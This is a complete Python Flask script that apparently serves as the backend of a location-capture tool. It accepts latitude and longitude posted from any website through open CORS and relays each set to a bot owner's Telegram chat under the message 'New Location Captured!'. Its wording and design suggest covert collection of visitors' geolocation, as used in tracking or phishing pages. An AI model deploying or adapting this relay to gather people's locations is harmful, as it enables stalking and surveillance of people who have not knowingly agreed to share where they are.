import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

# --- CONFIGURATION (from environment variables) ---
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_CHAT_ID = os.environ.get("OWNER_ID", "")
PORT = int(os.environ.get("PORT", 5000))
# --------------------------------------------------

app = Flask(__name__)
CORS(app)

def send_to_telegram(lat, lon):
    """Sends the location data to the bot owner via Telegram API."""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        message_text = f"📍 New Location Captured!\n\nLatitude: {lat}\nLongitude: {lon}"
        payload = {
            "chat_id": OWNER_CHAT_ID,
            "text": message_text
        }
        response = requests.post(url, json=payload, timeout=10)
        print(f"Telegram response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Error sending message to Telegram: {e}")

@app.route("/submit_location", methods=["POST"])
def submit_location():
    data = request.get_json()
    if not data or "lat" not in data or "lon" not in data:
        return jsonify({"status": "error", "message": "Missing latitude or longitude"}), 400
    latitude = data["lat"]
    longitude = data["lon"]
    send_to_telegram(latitude, longitude)
    return jsonify({"status": "success", "message": "Location received"})

@app.route("/", methods=["GET"])
def index():
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=False)

